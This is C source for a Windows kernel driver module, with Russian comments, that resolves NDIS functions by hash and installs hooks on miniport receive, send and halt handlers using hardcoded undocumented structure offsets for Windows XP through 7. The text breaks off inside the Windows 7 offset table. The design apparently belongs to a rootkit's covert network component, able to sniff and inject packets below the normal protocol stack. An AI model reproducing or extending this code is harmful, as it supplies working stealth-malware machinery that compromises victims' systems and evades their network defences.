#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#define DRIVER_NDIS_HASH 0x93d1485c        // ndis

#include "../../mod_shared/headers.h"

#include "mod_network.c"
#include "mod_networkApi.c"

NTSTATUS mod_networkEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_network_block_t pNetworkBlock;
    pmod_header_t pModHeader = (pmod_header_t)modBase;
    Fnpe_find_export_by_hash fnpe_find_export_by_hash = pCommonBlock->fnpe_find_export_by_hash;
    Fncommon_calc_hash fncommon_calc_hash = pCommonBlock->fncommon_calc_hash;
    LARGE_INTEGER delay;
    pvoid_t ndisBase = NULL;

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pNetworkBlock, sizeof(mod_network_block_t), NonPagedPool);
    pGlobalBlock->pNetworkBlock = pNetworkBlock;
    pNetworkBlock->pModBase = (uint8_t*)modBase;

#ifndef _SOLID_DRIVER

#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value((uint8_t*)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((uint8_t*)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER
    
    // Вычисление адресов всех глобальных функций для данного mod-а...
    
    // Ищем базу и размер драйвера NDIS.sys
    delay.QuadPart = -30000000I64; // 3 секунда.
    while ((ndisBase = pNetworkBlock->ndisBase = pCommonBlock->fncommon_find_base_by_driver_name(DRIVER_NDIS_HASH, &pNetworkBlock->ndisSize)) == NULL) {
        pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    }

    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocateMemoryWithTag, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreeMemory, ndisBase);

    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisGetPoolFromPacket, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisUnchainBufferAtFront, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreePacket,  ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisDprFreePacket, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocatePacket, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreeBufferPool, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreePacketPool, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocatePacketPool, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocateBufferPool, ndisBase);
    DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocateBuffer, ndisBase);

    if (pGlobalBlock->osMajorVersion > 5) {
        //(fnFindExportByHash)((pvoid_t*)&pGlobalData->fnNdisReturnNetBufferLists, ndisBase, NdisReturnNetBufferLists_Hash);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocateMdl, ndisBase);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocateNetBufferListPool, ndisBase);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreeNetBufferListPool, ndisBase);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisAllocateNetBufferAndNetBufferList, ndisBase);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreeNetBufferList, ndisBase);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisGetPoolFromNetBufferList, ndisBase);
        DECLARE_SYSTEM_FUNC(pNetworkBlock, NdisFreeMdl, ndisBase);
    }

    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdisFunc);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_unhook_ndis);

    DECLARE_GLOBAL_FUNC(pNetworkBlock, ndisQueryPacket);

    // NDIS хуки
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis5_EthRxIndicateHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis5_PacketIndicateHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis5_HaltHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis5_SendCompleteHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis5_OpenSendCompleteHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis6_ReceiveHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis6_HaltHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis6_PauseHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis6_RestartHandler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, HookNdis6_MSendNetBufferListsComplete);

    DECLARE_GLOBAL_FUNC(pNetworkBlock, convertStringIpToUINT32);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_destroy_adapter);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_destroy_all_adapters);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_on_halt);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, RegistryFindAdapterInfo);
    
    
    
    // Интерфейсные функции
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_shutdown_routine);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_search_for_adapters);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_plug_next_adapter);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_confirm_active_adapter);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_validate_hooks);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_set_input_packet_handler);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_allocate_packet_buffer);
    DECLARE_GLOBAL_FUNC(pNetworkBlock, network_send_packet);


    if (pGlobalBlock->osMajorVersion == 5) {
#ifndef _WIN64
        if (pGlobalBlock->osMinorVersion == 1) { // Windows XP (SP0, SP1, SP2, SP3)
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0x19C;    // NDIS_MINIPORT_BLOCK.NextGlobalMiniport
            pNetworkBlock->dwNdisEthDB                      = 0x0D8;    // NDIS_MINIPORT_BLOKC.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x000;    // X_FILTER.OpenList
            pNetworkBlock->dwNdisBindingHandle              = 0x004;    // X_BINDING_INFO.NdisBindingHandle
            pNetworkBlock->dwNdisFlags                      = 0x03C;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x020;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.MajorNdisVersion
            pNetworkBlock->dwNdisMDriverBlock               = 0x008;    // NDIS_MINIPORT_BLOCK.DriverHandle
            pNetworkBlock->dwNdisInterrupt                  = 0x038;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x000;    // NDIS_MINIPORT_BLOCK.InterruptEx
            pNetworkBlock->dwNdisMiniportDpc                = 0x010;    // NDIS_MINIPORT_INTERRUPT.MiniportDpc
            pNetworkBlock->dwNdisPhysicalMediumType         = 0x440;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x164;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x0e8;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x15C;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMSendHandler               = 0x050;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.SendHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x060;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x05C;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.ReturnPacketHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x0EC;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisSendCompleteHandler        = 0x038;    // NDIS_OPEN_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisHaltHandler                = 0x034;    // // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.HaltHandler
            pNetworkBlock->dwNdisSndNetBufLstsCmptHandler   = 0x000;    // NDIS_OPEN_BLOCK. - OK (NDIS 6.0)
            pNetworkBlock->dwNdisMiniportName               = 0x010;    // NDIS_MINIPORT_BLOCK.MiniportName
            pNetworkBlock->dwNdisMpAdapterContext           = 0x00C;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
        }
        else
#endif
        if (pGlobalBlock->osMinorVersion == 2) { // Win 2003 Server, Windows XP x64
#ifdef _WIN64
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0x2f8;    // NDIS_MINIPORT_BLOCK.NextGlobalMiniport
            pNetworkBlock->dwNdisEthDB                      = 0x190;    // NDIS_MINIPORT_BLOKC.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x000;    // X_FILTER.OpenList
            pNetworkBlock->dwNdisBindingHandle              = 0x008;    // X_BINDING_INFO.NdisBindingHandle
            pNetworkBlock->dwNdisFlags                      = 0x078;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x040;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.MajorNdisVersion
            pNetworkBlock->dwNdisInterrupt                  = 0x070;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x000;    // NDIS_MINIPORT_BLOCK.InterruptEx
            pNetworkBlock->dwNdisMiniportDpc                = 0x020;    // NDIS_MINIPORT_INTERRUPT.MiniportDpc
            pNetworkBlock->dwNdisPhysicalMediumType         = 0x1d0;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x280;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x1b0;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x270;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x0B8;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x0B0;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.ReturnPacketHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x1B8;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisSendCompleteHandler        = 0x070;    // NDIS_OPEN_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisHaltHandler                = 0x060;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.HaltHandler
            pNetworkBlock->dwNdisMiniportName               = 0x020;    // NDIS_MINIPORT_BLOCK.MiniportName
            pNetworkBlock->dwNdisMDriverBlock               = 0x010;    // NDIS_MINIPORT_BLOCK.DriverHandle
            pNetworkBlock->dwNdisMpAdapterContext           = 0x018;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
#else
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0x1a0;    // NDIS_MINIPORT_BLOCK.NextGlobalMiniport
            pNetworkBlock->dwNdisEthDB                      = 0x0D8;    // NDIS_MINIPORT_BLOKC.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x000;    // X_FILTER.OpenList
            pNetworkBlock->dwNdisBindingHandle              = 0x004;    // X_BINDING_INFO.NdisBindingHandle
            pNetworkBlock->dwNdisFlags                      = 0x03C;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x020;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.MajorNdisVersion
            pNetworkBlock->dwNdisMDriverBlock               = 0x008;    // NDIS_MINIPORT_BLOCK.DriverHandle
            pNetworkBlock->dwNdisInterrupt                  = 0x038;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x000;    // NDIS_MINIPORT_BLOCK.InterruptEx
            pNetworkBlock->dwNdisMiniportDpc                = 0x010;    // NDIS_MINIPORT_INTERRUPT.MiniportDpc
            pNetworkBlock->dwNdisPhysicalMediumType         = 0x0f8;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x164;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x0e8;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x15C;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMSendHandler               = 0x050;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.SendHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x060;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x05C;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.ReturnPacketHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x0EC;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisSendCompleteHandler        = 0x038;    // NDIS_OPEN_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisHaltHandler                = 0x034;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.HaltHandler
            pNetworkBlock->dwNdisSndNetBufLstsCmptHandler   = 0x000;    // NDIS_OPEN_BLOCK. - OK (NDIS 6.0)
            pNetworkBlock->dwNdisMiniportName               = 0x010;    // NDIS_MINIPORT_BLOCK.MiniportName
            pNetworkBlock->dwNdisMpAdapterContext           = 0x00C;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
#endif
        }
    }
    else if (pGlobalBlock->osMajorVersion == 6) {
        if (pGlobalBlock->osMinorVersion == 0) { // Vista, Windows Server 2008 (SP0)
#ifdef _WIN64
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0x1120;   // NDIS_MINIPORT_BLOCK.NextGlobalMiniport
            pNetworkBlock->dwNdisEthDB                      = 0x190;    // NDIS_MINIPORT_BLOCK.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x000;    // X_FILTER.OpenList
            pNetworkBlock->dwNdisBindingHandle              = 0x004;    // X_BINDING_INFO.NdisBindingHandle
            pNetworkBlock->dwNdisFlags                      = 0x078;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x070;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.MajorNdisVersion
            pNetworkBlock->dwNdisInterrupt                  = 0x070;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x070;    // NDIS_MINIPORT_BLOCK.InterruptEx
            pNetworkBlock->dwNdisMiniportDpc                = 0x020;    // NDIS_INTERRUPT_BLOCK.MiniportDpc
            pNetworkBlock->dwNdisPhysicalMediumType         = 0x1d0;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x280;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x1B0;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x0E8;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x0E0;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.ReturnPacketHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x270;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x1B8;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisSendCompleteHandler        = 0x070;    // NDIS_OPEN_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisHaltHandler                = 0x090;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.HaltHandler
            pNetworkBlock->dwNdisPauseHandler               = 0x0A0;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.PauseHandler
            pNetworkBlock->dwNdisRestartHandler             = 0x0A8;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.RestartHandler
            pNetworkBlock->dwNdisSndNetBufLstsCmptHandler   = 0xCB0;    // NDIS_MINIPORT_BLOCK.SendNetBufferListsCompleteHandler
            pNetworkBlock->dwNdisMiniportName               = 0x10f8;   // NDIS_MINIPORT_BLOCK.MiniportName
            pNetworkBlock->dwNdisMDriverBlock               = 0x1070;   // NDIS_MINIPORT_BLOCK.DriverHandle
            pNetworkBlock->dwNdisSendNetBufferLists         = 0x0B8;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.SendNetBufferListsHandler
            pNetworkBlock->dwNdisReturnNetBufferLists       = 0x0C0;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisMpAdapterContext           = 0x018;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
            pNetworkBlock->dwNdisIndicateNBLHandler         = 0x2F0;    // NDIS_MINIPORT_BLOCK.IndicateNetBufferListsHandler

            pNetworkBlock->dwNdisLowestFilter                       = 0xaa0; // NDIS_MINIPORT_BLOCK.LowestFilter
            pNetworkBlock->dwNdisFilterDriver                       = 0x010; // NDIS_FILTER_BLOCK.FilterDriver
            pNetworkBlock->dwNdisDriverObject                       = 0x010; // NDIS_FILTER_DRIVER_BLOCK.ImageName (absent)
            pNetworkBlock->dwNdisWiFiSendNetBufferListsHandler      = 0x0C8; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.SendNetBufferListsHandler
            pNetworkBlock->dwNdisWiFiReturnNetBufferListsHandler    = 0x0E8; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisFilterModuleContext                = 0x018; // NDIS_FILTER_BLOCK.FilterModuleContext
            pNetworkBlock->dwNdisWiFiDriverObject                   = 0x010; // NDIS_FILTER_DRIVER_BLOCK.DriverObject
            pNetworkBlock->dwNdisHigherFilter                       = 0x478; // NDIS_FILTER_BLOCK.HigherFilter
#else
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0xA60;    // NDIS_MINIPORT_BLOCK.NextGlobalMiniport (except SP0)
            pNetworkBlock->dwNdisEthDB                      = 0x0D8;    // NDIS_MINIPORT_BLOCK.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x004;    // X_FILTER.NoFTypeOpenList ?
            pNetworkBlock->dwNdisBindingHandle              = 0x004;    // X_BINDING_INFO.NdisBindingHandle ?
            pNetworkBlock->dwNdisFlags                      = 0x03C;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x038;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.MajorNdisVersion

            pNetworkBlock->dwNdisInterrupt                  = 0x038;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x038;    // NDIS_MINIPORT_BLOCK.InterruptEx
            pNetworkBlock->dwNdisMiniportDpc                = 0x010;    // NDIS_MINIPORT_INTERRUPT.MiniportDpc

            pNetworkBlock->dwNdisPhysicalMediumType         = 0x420;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisHaltHandler                = 0x04c;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.HaltHandlerEx
            pNetworkBlock->dwNdisPauseHandler               = 0x054;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.PauseHandler
            pNetworkBlock->dwNdisRestartHandler             = 0x058;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.RestartHandler
            pNetworkBlock->dwNdisSendNetBufferLists         = 0x060;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.SendNetBufferListsHandler
            pNetworkBlock->dwNdisReturnNetBufferLists       = 0x064;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisMpAdapterContext           = 0x00C;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
            pNetworkBlock->dwNdisIndicateNBLHandler         = 0x19C;    // NDIS_MINIPORT_BLOCK.IndicateNetBufferListsHandler

            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x164;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x0e8;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x15C;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x078;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x074;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.ReturnPacketHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x0EC;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisMDriverBlock               = 0xA00;    // NDIS_MINIPORT_BLOCK.DriverHandle (except SP0)
            pNetworkBlock->dwNdisMiniportName               = 0xA4C;    // NDIS_MINIPORT_BLOCK.MiniportName (except SP0)
            pNetworkBlock->dwNdisSndNetBufLstsCmptHandler   = 0x74c;    // NDIS_MINIPORT_BLOCK._NDIS_MINIPORT_HANDLERS.SendNetBufferListsCompleteHandler

            pNetworkBlock->dwNdisLowestFilter                       = 0x634; // NDIS_MINIPORT_BLOCK.LowestFilter
            pNetworkBlock->dwNdisFilterDriver                       = 0x008; // NDIS_FILTER_BLOCK.FilterDriver
            pNetworkBlock->dwNdisDriverObject                       = 0x008; // NDIS_FILTER_DRIVER_BLOCK.ImageName (absent)
            pNetworkBlock->dwNdisWiFiSendNetBufferListsHandler      = 0x068; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.SendNetBufferListsHandler
            pNetworkBlock->dwNdisWiFiReturnNetBufferListsHandler    = 0x078; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisFilterModuleContext                = 0x00C; // NDIS_FILTER_BLOCK.FilterModuleContext
            pNetworkBlock->dwNdisWiFiDriverObject                   = 0x008; // NDIS_FILTER_DRIVER_BLOCK.DriverObject
            pNetworkBlock->dwNdisHigherFilter                       = 0x248; // NDIS_FILTER_BLOCK.HigherFilter
#endif
        }
        else if (pGlobalBlock->osMinorVersion == 1) { // Windows 7, Windows Server 2008 R2 (x86)
#ifdef _WIN64
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0x1478;   // NDIS_MINIPORT_BLOCK.NextGlobalMiniport
            pNetworkBlock->dwNdisEthDB                      = 0x190;    // NDIS_MINIPORT_BLOCK.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x000;    // X_FILTER.OpenList
            pNetworkBlock->dwNdisBindingHandle              = 0x004;    // X_BINDING_INFO.NdisBindingHandle
            pNetworkBlock->dwNdisFlags                      = 0x078;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x070;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.MajorNdisVersion
            pNetworkBlock->dwNdisInterrupt                  = 0x070;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x338;    // NDIS_MINIPORT_BLOCK.InterruptEx
            pNetworkBlock->dwNdisMiniportDpc                = 0x020;    // NDIS_INTERRUPT_BLOCK.MiniportDpc
            pNetworkBlock->dwNdisPhysicalMediumType         = 0x6F0;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x280;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x1B0;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x0E8;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x0E0;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.ReturnPacketHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x270;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x1B8;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisSendCompleteHandler        = 0x070;    // NDIS_OPEN_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisHaltHandler                = 0x090;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.HaltHandler
            pNetworkBlock->dwNdisPauseHandler               = 0x0A0;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.PauseHandler
            pNetworkBlock->dwNdisRestartHandler             = 0x0A8;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.RestartHandler
            pNetworkBlock->dwNdisSndNetBufLstsCmptHandler   = 0xF20;    // NDIS_MINIPORT_BLOCK.SendNetBufferListsCompleteHandler
            pNetworkBlock->dwNdisMiniportName               = 0x1450;   // NDIS_MINIPORT_BLOCK.MiniportName
            pNetworkBlock->dwNdisMDriverBlock               = 0x13C8;   // NDIS_MINIPORT_BLOCK.DriverHandle
            pNetworkBlock->dwNdisSendNetBufferLists         = 0x0B8;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.SendNetBufferListsHandler
            pNetworkBlock->dwNdisReturnNetBufferLists       = 0x0C0;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisMpAdapterContext           = 0x018;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
            pNetworkBlock->dwNdisIndicateNBLHandler         = 0x2F0;    // NDIS_MINIPORT_BLOCK.IndicateNetBufferListsHandler

            pNetworkBlock->dwNdisLowestFilter                       = 0xce0; // NDIS_MINIPORT_BLOCK.LowestFilter
            pNetworkBlock->dwNdisFilterDriver                       = 0x010; // NDIS_FILTER_BLOCK.FilterDriver
            pNetworkBlock->dwNdisDriverObject                       = 0x010; // NDIS_FILTER_DRIVER_BLOCK.ImageName
            pNetworkBlock->dwNdisWiFiSendNetBufferListsHandler      = 0x0C8; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.SendNetBufferListsHandler
            pNetworkBlock->dwNdisWiFiReturnNetBufferListsHandler    = 0x0E8; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisFilterModuleContext                = 0x018; // NDIS_FILTER_BLOCK.FilterModuleContext
            pNetworkBlock->dwNdisWiFiDriverObject                   = 0x010; // NDIS_FILTER_DRIVER_BLOCK.DriverObject
            pNetworkBlock->dwNdisHigherFilter                       = 0x068; // NDIS_FILTER_BLOCK.HigherFilter
#else
            pNetworkBlock->dwNdisNextGlobalMiniport         = 0xE64;    // NDIS_MINIPORT_BLOCK.NextGlobalMiniport
            pNetworkBlock->dwNdisEthDB                      = 0x0D8;    // NDIS_MINIPORT_BLOKC.EthDB
            pNetworkBlock->dwNdisOpenList                   = 0x000;    // X_FILTER.OpenList
            pNetworkBlock->dwNdisBindingHandle              = 0x004;    // X_BINDING_INFO.NdisBindingHandle
            pNetworkBlock->dwNdisFlags                      = 0x03C;    // NDIS_MINIPORT_BLOCK.Flags
            pNetworkBlock->dwNdisMajorVersion               = 0x038;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.MajorNdisVersion
            pNetworkBlock->dwNdisInterrupt                  = 0x038;    // NDIS_MINIPORT_BLOCK.Interrupt
            pNetworkBlock->dwNdisInterruptEx                = 0x1c0;    // NDIS_MINIPORT_BLOCK.InterruptEx
